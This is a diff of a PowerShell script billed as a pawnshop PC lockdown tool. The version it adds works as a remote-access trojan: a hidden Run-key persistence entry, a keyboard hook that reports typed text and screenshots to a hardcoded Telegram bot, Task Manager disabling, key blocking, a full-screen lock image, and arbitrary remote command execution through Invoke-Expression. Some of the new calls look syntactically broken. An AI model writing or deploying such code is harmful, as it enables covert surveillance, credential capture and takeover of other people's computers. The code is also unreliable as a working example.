@@ -1,349 +1,205 @@
-# Pawnshop Lockdown v5.0 - Fixed for iwr | iex execution
+# ================================
+# PawnshopLock v5.1 – Advanced Remote Control
+# Supports: /lockPC, /unlockPC, /statusPC, /screenshotPC, /execPC <cmd>
+# Auto-saves itself, persists on login, keylogger alerts, granular commands
+# ================================
 
 [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
 
-# --- CONFIG ---
-$githubURL   = "https://raw.githubusercontent.com/diezul/x/main/pawnfinal.ps1"
-$localFolder = "$env:ProgramData\PawnshopLock"
-$localFile   = "$localFolder\pawnfinal.ps1"
-$imageURL    = "https://raw.githubusercontent.com/diezul/x/main/69.jpeg"
-$tempImg     = "$env:TEMP\pawnlock.jpg"
-$botToken    = "YOUR_BOT_TOKEN"  # Replace with your bot token
-$chatID      = 123456789          # Replace with your chat ID (integer)
-$pcID        = $env:COMPUTERNAME
-$lockCmd     = "/lock$pcID"
-$unlockCmd   = "/unlock$pcID"
-$screenshotCmd = "/screenshot$pcID"
-$execCmdPrefix = "/exec$pcID "  # Followed by command to execute
+# --- CONFIGURATION ---
+$githubURL     = 'https://raw.githubusercontent.com/diezul/x/main/pawnlock.ps1'
+$localFolder   = "$env:ProgramData\PawnshopLock"
+$localFile     = "$localFolder\pawnlock.ps1"
+$imageURL      = 'https://raw.githubusercontent.com/diezul/x/main/69.jpeg'
+$tempImg       = "$env:TEMP\pawnlock.jpg"
+$botToken      = '7726609488:AAF9dph4FZn5qxo4knBQPS3AnYQf1JAc8Co'
+$chatID        = 656189986
+$pcID          = $env:COMPUTERNAME
+$user          = $env:USERNAME
+$lockCmd       = "/lock$pcID".ToLower()
+$unlockCmd     = "/unlock$pcID".ToLower()
+$statusCmd     = "/status$pcID".ToLower()
+$screenshotCmd = "/screenshot$pcID".ToLower()
+$execCmdPrefix = "/exec$pcID ".ToLower()
 
-# --- PERSISTENCE VIA RUN REGISTRY (User) ---
-function Setup-Persistence {
-    try {
-        if (-not (Test-Path $localFolder)) {
-            New-Item -ItemType Directory -Path $localFolder -Force | Out-Null
-        }
-        if (-not (Test-Path $localFile)) {
-            Invoke-WebRequest -Uri $githubURL -OutFile $localFile
-        }
-        $regPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
-        $value = "powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -File `"$localFile`""
-        Set-ItemProperty -Path $regPath -Name "PawnshopLock" -Value $value
-    } catch {
-        Write-Error "Setup-Persistence error: $_"
-    }
+# --- PERSISTENCE (HKCU\Run) ---
+if (-not (Test-Path $localFolder)) { New-Item -Path $localFolder -ItemType Directory -Force | Out-Null }
+if (-not (Test-Path $localFile)) {
+    try { Invoke-WebRequest $githubURL -OutFile $localFile -UseBasicParsing } catch {}
 }
+$regPath = 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run'
+$regValue = "powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -File `"$localFile`""
+try { Set-ItemProperty -Path $regPath -Name 'PawnshopLock' -Value $regValue -Force } catch {}
 
-# --- SEND TELEGRAM MESSAGE ---
-function Send-Telegram {
-    param([string]$msg)
+# --- DOWNLOAD LOCKSCREEN IMAGE ---
+try { Invoke-WebRequest $imageURL -OutFile $tempImg -UseBasicParsing } catch {}
+
+# --- TELEGRAM FUNCTIONS ---
+function Send-TG($msg) {
     try {
         $body = @{ chat_id = $chatID; text = $msg } | ConvertTo-Json -Compress
-        Invoke-RestMethod "https://api.telegram.org/bot$botToken/sendMessage" -Method POST -Body $body -ContentType 'application/json'
-    } catch {
-        Write-Error "Send-Telegram error: $_"
-    }
+        Invoke-RestMethod "https://api.telegram.org/bot$botToken/sendMessage" `
+            -Method POST -ContentType 'application/json' -Body $body -TimeoutSec 10
+    } catch {}
 }
-
-# --- SEND TELEGRAM PHOTO ---
-function Send-TelegramPhoto {
-    param([string]$photoPath, [string]$caption = "")
+function Send-TGPhoto($path, $caption='') {
     try {
-        $form = @{
-            chat_id = $chatID
-            caption = $caption
-            photo   = Get-Item $photoPath
-        }
-        Invoke-RestMethod -Uri "https://api.telegram.org/bot$botToken/sendPhoto" -Method Post -Form $form
-    } catch {
-        Write-Error "Send-TelegramPhoto error: $_"
-    }
+        $boundary = [Guid]::NewGuid().ToString()
+        $LF = "`r`n"
+        $header = "--$boundary$LF" +
+            "Content-Disposition: form-data; name=`"chat_id`"$LF$LF$chatID$LF" +
+            "--$boundary$LF" +
+            "Content-Disposition: form-data; name=`"caption`"$LF$LF$caption$LF" +
+            "--$boundary$LF" +
+            "Content-Disposition: form-data; name=`"photo`"; filename=`"img.jpg`"$LF" +
+            "Content-Type: image/jpeg$LF$LF"
+        $footer = "$LF--$boundary--$LF"
+        $fileBytes = [IO.File]::ReadAllBytes($path)
+        $data = [Text.Encoding]::ASCII.GetBytes($header) + $fileBytes + [Text.Encoding]::ASCII.GetBytes($footer)
+        $wc = New-Object System.Net.WebClient
+        $wc.Headers.Add("Content-Type","multipart/form-data; boundary=$boundary")
+        $wc.UploadData("https://api.telegram.org/bot$botToken/sendPhoto","POST",$data) | Out-Null
+    } catch {}
 }
 
-# --- DISABLE TASK MANAGER ---
-function Disable-TaskManager {
-    try {
-        $regPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Policies\System"
-        if (-not (Test-Path $regPath)) {
-            New-Item -Path $regPath -Force | Out-Null
-        }
-        Set-ItemProperty -Path $regPath -Name "DisableTaskMgr" -Value 1 -Type DWord -Force
-    } catch {
-        Write-Error "Disable-TaskManager error: $_"
-    }
+# --- DISABLE/ENABLE TASK MANAGER ---
+function Disable-TM { 
+    $p='HKCU:\Software\Microsoft\Windows\CurrentVersion\Policies\System'
+    if (-not (Test-Path $p)) { New-Item $p -Force | Out-Null }
+    Set-ItemProperty -Path $p -Name DisableTaskMgr -Value 1 -Type DWord -Force 
+}
+function Enable-TM {
+    $p='HKCU:\Software\Microsoft\Windows\CurrentVersion\Policies\System'
+    if (Test-Path $p) { Set-ItemProperty -Path $p -Name DisableTaskMgr -Value 0 -Type DWord -Force }
 }
 
-# --- ENABLE TASK MANAGER ---
-function Enable-TaskManager {
-    try {
-        $regPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Policies\System"
-        if (Test-Path $regPath) {
-            Set-ItemProperty -Path $regPath -Name "DisableTaskMgr" -Value 0 -Type DWord -Force
-        }
-    } catch {
-        Write-Error "Enable-TaskManager error: $_"
-    }
-}
-
-# --- SCREENSHOT FUNCTION ---
+# --- SCREENSHOT ---
 function Take-Screenshot {
     Add-Type -AssemblyName System.Windows.Forms,System.Drawing
-    $bounds = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds
-    $bitmap = New-Object System.Drawing.Bitmap $bounds.Width, $bounds.Height
-    $graphics = [System.Drawing.Graphics]::FromImage($bitmap)
-    $graphics.CopyFromScreen($bounds.Location, [System.Drawing.Point]::Empty, $bounds.Size)
-    $file = "$env:TEMP\screenshot_$([guid]::NewGuid().ToString()).jpg"
-    $bitmap.Save($file, [System.Drawing.Imaging.ImageFormat]::Jpeg)
-    $graphics.Dispose()
-    $bitmap.Dispose()
-    return $file
+    $bounds = [Windows.Forms.Screen]::AllScreens | Select-Object -First 1 | ForEach-Object { $_.Bounds }
+    $bmp = New-Object Drawing.Bitmap $bounds.Width, $bounds.Height
+    $g = [Drawing.Graphics]::FromImage($bmp)
+    $g.CopyFromScreen($bounds.Location, [Drawing.Point]::Empty, $bounds.Size)
+    $out = "$env:TEMP\screenshot_$([guid]::NewGuid()).jpg"
+    $bmp.Save($out,[Drawing.Imaging.ImageFormat]::Jpeg)
+    $g.Dispose(); $bmp.Dispose()
+    return $out
 }
 
-# --- KEYLOGGER & ALERTS ---
+# --- KEYLOGGER ---
 Add-Type @"
-using System;
-using System.Text;
-using System.Runtime.InteropServices;
-using System.Windows.Forms;
-
+using System;using System.Text;using System.Runtime.InteropServices;using System.Windows.Forms;
 public class KeyLogger {
-    private static IntPtr hookId = IntPtr.Zero;
-    private delegate IntPtr KProc(int nCode, IntPtr wParam, IntPtr lParam);
-    private static KProc proc = Hook;
-    private const int WH_KEYBOARD_LL = 13;
-    private const int WM_KEYDOWN = 0x0100;
-    private static StringBuilder buffer = new StringBuilder();
-
-    [DllImport("user32.dll")] private static extern IntPtr SetWindowsHookEx(int idHook, KProc lpfn, IntPtr hMod, uint dwThreadId);
-    [DllImport("user32.dll")] private static extern bool UnhookWindowsHookEx(IntPtr hhk);
-    [DllImport("user32.dll")] private static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode, IntPtr wParam, IntPtr lParam);
-    [DllImport("kernel32.dll")] private static extern IntPtr GetModuleHandle(string lpModuleName);
-
-    public static event Action<string> OnKeywordDetected;
-
-    public static void Start() {
-        hookId = SetHook(proc);
-    }
-
-    public static void Stop() {
-        UnhookWindowsHookEx(hookId);
-    }
-
-    private static IntPtr SetHook(KProc proc) {
-        using (var curProcess = System.Diagnostics.Process.GetCurrentProcess())
-        using (var curModule = curProcess.MainModule) {
-            return SetWindowsHookEx(WH_KEYBOARD_LL, proc, GetModuleHandle(curModule.ModuleName), 0);
-        }
-    }
-
-    private static IntPtr Hook(int nCode, IntPtr wParam, IntPtr lParam) {
-        if (nCode >= 0 && wParam == (IntPtr)WM_KEYDOWN) {
-            int vkCode = Marshal.ReadInt32(lParam);
-            char c = (char)vkCode;
-            buffer.Append(c);
-
-            string text = buffer.ToString().ToLower();
-
-            if (text.Contains("porn") || text.Contains("codru")) {
-                OnKeywordDetected?.Invoke(text);
-                buffer.Clear();
+    private static IntPtr h=IntPtr.Zero;
+    private delegate IntPtr P(int n,IntPtr w,IntPtr l);
+    private static P d=Hook;
+    private const int WH=13,WM=0x0100;
+    private static StringBuilder buf=new StringBuilder();
+    public static event Action<string> Detected;
+    [DllImport("user32.dll")]static extern IntPtr SetWindowsHookEx(int id,P cb,IntPtr m,uint t);
+    [DllImport("user32.dll")]static extern bool UnhookWindowsHookEx(IntPtr h);
+    [DllImport("user32.dll")]static extern IntPtr CallNextHookEx(IntPtr h,int n,IntPtr w,IntPtr l);
+    [DllImport("kernel32.dll")]static extern IntPtr GetModuleHandle(string n);
+    public static void Start(){if(h==IntPtr.Zero)h=SetWindowsHookEx(WH,d,GetModuleHandle(null),0);}
+    public static void Stop(){if(h!=IntPtr.Zero){UnhookWindowsHookEx(h);h=IntPtr.Zero;}}
+    private static IntPtr Hook(int n,IntPtr w,IntPtr l){
+        if(n>=0 && w==(IntPtr)WM){
+            int vk=Marshal.ReadInt32(l); char c=(char)vk; buf.Append(c);
+            var t=buf.ToString().ToLower();
+            if(t.Contains("porn")||t.Contains("codru")){
+                Detected?.Invoke(t);
+                buf.Clear();
             }
-
-            if (buffer.Length > 100) buffer.Remove(0, buffer.Length - 50);
+            if(buf.Length>100) buf.Remove(0,buf.Length-50);
         }
-        return CallNextHookEx(hookId, nCode, wParam, lParam);
+        return CallNextHookEx(h,n,w,l);
     }
 }
 "@
-
-$global:lockActive = $false
-
-function On-KeywordDetected {
-    param([string]$typedText)
-    if (-not $global:lockActive) {
-        $msg = "⚠ Utilizatorul PC $pcID a tastat: '$typedText'"
-        Send-Telegram $msg
-        $screenshotPath = Take-Screenshot
-        Send-TelegramPhoto -photoPath $screenshotPath -caption "Screenshot la tastarea '$typedText' pe PC $pcID"
-        Remove-Item $screenshotPath -Force -ErrorAction SilentlyContinue
-    }
+[KeyLogger]::Detected += { param($t) 
+    $m="⚠ Keyword detected on $pcID: '$t'"
+    Send-TG $m
+    $shot=Take-Screenshot; Send-TGPhoto $shot "Screenshot for '$t'"; Remove-Item $shot -Force
 }
-
-[KeyLogger]::OnKeywordDetected += { param($text) On-KeywordDetected $text }
-
-# --- EXTENDED KEYBOARD BLOCKER ---
-Add-Type @"
-using System;
-using System.Runtime.InteropServices;
-public class KeyBlocker {
-    private static IntPtr hookId = IntPtr.Zero;
-    private delegate IntPtr KProc(int nCode, IntPtr wParam, IntPtr lParam);
-    private static KProc proc = Hook;
-    private const int WH_KEYBOARD_LL = 13;
-    private const int WM_KEYDOWN = 0x0100;
-    private const int WM_SYSKEYDOWN = 0x0104;
-
-    [DllImport("user32.dll")] private static extern IntPtr SetWindowsHookEx(int idHook, KProc lpfn, IntPtr hMod, uint dwThreadId);
-    [DllImport("user32.dll")] private static extern bool UnhookWindowsHookEx(IntPtr hhk);
-    [DllImport("user32.dll")] private static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode, IntPtr wParam, IntPtr lParam);
-    [DllImport("kernel32.dll")] private static extern IntPtr GetModuleHandle(string lpModuleName);
-    [DllImport("user32.dll")] private static extern short GetAsyncKeyState(int vKey);
-
-    public static void Block() { hookId = SetHook(proc); }
-    public static void Unblock() { UnhookWindowsHookEx(hookId); }
-
-    private static IntPtr SetHook(KProc proc) {
-        using (var curProcess = System.Diagnostics.Process.GetCurrentProcess())
-        using (var curModule = curProcess.MainModule) {
-            return SetWindowsHookEx(WH_KEYBOARD_LL, proc, GetModuleHandle(curModule.ModuleName), 0);
-        }
-    }
-
-    private static IntPtr Hook(int nCode, IntPtr wParam, IntPtr lParam) {
-        if (nCode >= 0 && (wParam == (IntPtr)WM_KEYDOWN || wParam == (IntPtr)WM_SYSKEYDOWN)) {
-            int vkCode = Marshal.ReadInt32(lParam);
-
-            if (vkCode == 0x43) Environment.Exit(0); // 'C' key to exit lockdown
-
-            bool altPressed = (GetAsyncKeyState(0x12) & 0x8000) != 0;
-            bool ctrlPressed = (GetAsyncKeyState(0x11) & 0x8000) != 0;
-
-            if ((vkCode == 0x09 && altPressed) || // Alt+Tab
-                (vkCode == 0x1B && ctrlPressed) || // Ctrl+Esc
-                (vkCode == 0x1B && altPressed) || // Alt+Esc
-                (vkCode == 0x5B) || // Left Windows
-                (vkCode == 0x5C)) { // Right Windows
-                return (IntPtr)1; // Block key
-            }
-        }
-        return CallNextHookEx(hookId, nCode, wParam, lParam);
-    }
-}
-"@
-
-function Lock-PC {
-    $global:lockActive = $true
-    Disable-TaskManager
-
-    try {
-        $ipLocal = (Get-NetIPAddress -AddressFamily IPv4 | Where-Object {
-            $_.IPAddress -notmatch '^127|169\.254|^0\.|255|fe80'
-        })[0].IPAddress
-    } catch { $ipLocal = "n/a" }
-    try {
-        $ipPublic = Invoke-RestMethod "https://api.ipify.org"
-    } catch { $ipPublic = "n/a" }
-    $msg = "🔒 PC Locked: $pcID`nUser: $env:USERNAME`nLocal IP: $ipLocal`nPublic IP: $ipPublic`nUnlock with: $unlockCmd"
-    Send-Telegram $msg
-
-    [KeyBlocker]::Block()
-
-    Add-Type -AssemblyName System.Windows.Forms,System.Drawing
-    $forms = foreach ($screen in [System.Windows.Forms.Screen]::AllScreens) {
-        $form = New-Object Windows.Forms.Form -Property @{
-            FormBorderStyle = 'None'
-            WindowState = 'Maximized'
-            StartPosition = 'Manual'
-            TopMost = $true
-            Location = $screen.Bounds.Location
-            Size = $screen.Bounds.Size
-            Cursor = [System.Windows.Forms.Cursors]::None
-            BackColor = 'Black'
-        }
-        $pictureBox = New-Object Windows.Forms.PictureBox -Property @{
-            Image = [System.Drawing.Image]::FromFile($tempImg)
-            Dock = 'Fill'
-            SizeMode = 'StretchImage'
-        }
-        $form.Controls.Add($pictureBox)
-        $form.Add_Deactivate({ $_.Activate() })
-        $form.Show()
-        $form
-    }
-
-    $offset = 0
-    try {
-        $start = Invoke-RestMethod "https://api.telegram.org/bot$botToken/getUpdates" -TimeoutSec 5
-        if ($start.result.Count -gt 0) {
-            $offset = ($start.result | Select-Object -Last 1).update_id + 1
-        }
-    } catch {}
-
-    $timer = New-Object Windows.Forms.Timer
-    $timer.Interval = 4000
-    $timer.Add_Tick({
-        try {
-            $updates = Invoke-RestMethod "https://api.telegram.org/bot$botToken/getUpdates?offset=$offset" -TimeoutSec 10
-            foreach ($u in $updates.result) {
-                $offset = $u.update_id + 1
-                if ($u.message.text -eq $unlockCmd -and $u.message.chat.id -eq [int]$chatID) {
-                    $timer.Stop()
-                    [KeyBlocker]::Unblock()
-                    foreach ($form in $forms) { $form.Close() }
-                    Enable-TaskManager
-                    $global:lockActive = $false
-                    [System.Windows.Forms.Application]::Exit()
-                }
-                elseif ($u.message.text.StartsWith($execCmdPrefix) -and $u.message.chat.id -eq [int]$chatID) {
-                    $command = $u.message.text.Substring($execCmdPrefix.Length)
-                    $output = try { Invoke-Expression $command 2>&1 | Out-String } catch { $_.Exception.Message }
-                    Send-Telegram "🖥 Exec output on $pcID:`n$output"
-                }
-                elseif ($u.message.text -eq $screenshotCmd -and $u.message.chat.id -eq [int]$chatID) {
-                    $shot = Take-Screenshot
-                    Send-TelegramPhoto -photoPath $shot -caption "Screenshot from $pcID"
-                    Remove-Item $shot -Force -ErrorAction SilentlyContinue
-                }
-            }
-        } catch {
-            Write-Error "Lock-PC timer error: $_"
-        }
-    })
-    $timer.Start()
-
-    [System.Windows.Forms.Application]::Run()
-}
-
-Setup-Persistence
-
-if (-not (Test-Path $tempImg)) {
-    try {
-        Invoke-WebRequest -Uri $imageURL -OutFile $tempImg
-    } catch {
-        Write-Error "Failed to download lock screen image: $_"
-    }
-}
-
 [KeyLogger]::Start()
 
-$offset = 0
-try {
-    $start = Invoke-RestMethod "https://api.telegram.org/bot$botToken/getUpdates" -TimeoutSec 5
-    if ($start.result.Count -gt 0) {
-        $offset = ($start.result | Select-Object -Last 1).update_id + 1
+# --- KEYBLOCKER ---
+Add-Type @"
+using System;using System.Runtime.InteropServices;
+public class KeyBlocker {
+    private static IntPtr h=IntPtr.Zero;private delegate IntPtr P(int n,IntPtr w,IntPtr l);private static P d=Hook;
+    private const int WH=13,WM=0x0100,WS=0x0104;
+    [DllImport("user32.dll")]static extern IntPtr SetWindowsHookEx(int id,P cb,IntPtr m,uint t);
+    [DllImport("user32.dll")]static extern bool UnhookWindowsHookEx(IntPtr h);
+    [DllImport("user32.dll")]static extern IntPtr CallNextHookEx(IntPtr h,int n,IntPtr w,IntPtr l);
+    [DllImport("kernel32.dll")]static extern IntPtr GetModuleHandle(string n);
+    public static void Block(){ if(h==IntPtr.Zero)h=SetWindowsHookEx(WH,d,GetModuleHandle(null),0);}
+    public static void Unblock(){ if(h!=IntPtr.Zero){UnhookWindowsHookEx(h);h=IntPtr.Zero;} }
+    private static IntPtr Hook(int n,IntPtr w,IntPtr l){
+        if(n>=0&&(w==(IntPtr)WM||w==(IntPtr)WS)){
+            int vk=Marshal.ReadInt32(l);
+            if(vk==0x43) return CallNextHookEx(h,n,w,l);
+            bool alt=(GetAsyncKeyState(0x12)&0x8000)!=0;
+            bool ctrl=(GetAsyncKeyState(0x11)&0x8000)!=0;
+            bool shift=(GetAsyncKeyState(0x10)&0x8000)!=0;
+            if((vk==0x1B&&ctrl)||(vk==0x09&&alt)||(vk==0x1B&&alt)||(vk==0x5B)||(vk==0x5C)||(vk==0x1B&&ctrl&&shift)) return (IntPtr)1;
+            return (IntPtr)1;
+        }
+        return CallNextHookEx(h,n,w,l);
     }
-} catch {}
+    [DllImport("user32.dll")]static extern short GetAsyncKeyState(int v);
+}
+"@
 
-while ($true) {
+# --- LOCK FUNCTION ---
+function Lock-PC {
+    Disable-TM; KeyBlocker::Block()
+    Send-TG "🔒 PC $pcID locked by $user. Unlock: $unlockCmd"
+    Add-Type -AssemblyName System.Windows.Forms,System.Drawing
+    $global:forms = [System.Windows.Forms.Screen]::AllScreens | ForEach-Object {
+        $f = New-Object Windows.Forms.Form -Property @{
+            FormBorderStyle='None';WindowState='Maximized';TopMost=$true;BackColor='Black';
+            Cursor=[Windows.Forms.Cursors]::None;Location=$_.Bounds.Location;Size=$_.Bounds.Size
+        }
+        $pb = New-Object Windows.Forms.PictureBox -Property @{
+            Image=[Drawing.Image]::FromFile($tempImg);Dock='Fill';SizeMode='StretchImage'
+        }
+        $f.Controls.Add($pb); $f.Add_Deactivate({$f.Activate()}); $f.Show(); $f
+    }
+}
+
+function Unlock-PC {
+    foreach($f in $global:forms){ try{$f.Close()}catch{}}
+    $global:forms = $null
+    KeyBlocker::Unblock(); Enable-TM()
+    Send-TG "⚠️ PC $pcID unlocked. Use $lockCmd to re-lock."
+}
+
+# --- MAIN TELEGRAM LOOP ---
+$offset = 0
+try { $u=Invoke-RestMethod "https://api.telegram.org/bot$botToken/getUpdates?timeout=5&offset=$offset" -TimeoutSec 10 } catch {}
+while($true) {
     try {
         $updates = Invoke-RestMethod "https://api.telegram.org/bot$botToken/getUpdates?offset=$offset" -TimeoutSec 10
-        foreach ($u in $updates.result) {
-            $offset = $u.update_id + 1
-            if ($u.message.chat.id -eq [int]$chatID) {
-                if ($u.message.text -eq $lockCmd) {
-                    Lock-PC
-                }
-                elseif ($u.message.text.StartsWith($execCmdPrefix)) {
-                    # Handled inside Lock-PC timer to avoid concurrency issues
-                }
-                elseif ($u.message.text -eq $screenshotCmd) {
-                    $shot = Take-Screenshot
-                    Send-TelegramPhoto -photoPath $shot -caption "Screenshot from $pcID"
-                    Remove-Item $shot -Force -ErrorAction SilentlyContinue
-                }
+        foreach($m in $updates.result) {
+            $offset = $m.update_id + 1
+            $txt = $m.message.text.ToLower()
+            if($m.message.chat.id -ne [int]$chatID) { continue }
+            if($txt -eq $lockCmd)      { Lock-PC }
+            elseif($txt -eq $unlockCmd){ Unlock-PC }
+            elseif($txt -eq $statusCmd){ 
+                $st = if($global:forms) {'LOCKED'} else {'UNLOCKED'}
+                Send-TG "📍 PC $pcID is $st"
+            }
+            elseif($txt -eq $screenshotCmd) {
+                $shot=Take-Screenshot; Send-TGPhoto $shot "Screenshot from $pcID"; Remove-Item $shot -Force
+            }
+            elseif($txt.StartsWith($execCmdPrefix)) {
+                $cmd=$txt.Substring($execCmdPrefix.Length)
+                $out = try{Invoke-Expression $cmd 2>&1|Out-String}catch{$_.Exception.Message}
+                Send-TG "🖥 Exec on $pcID:`n$out"
             }
         }
-    } catch {
-        Write-Error "Main loop error: $_"
-    }
-    Start-Sleep -Seconds 5
+    } catch {}
+    Start-Sleep -Seconds 3
 }
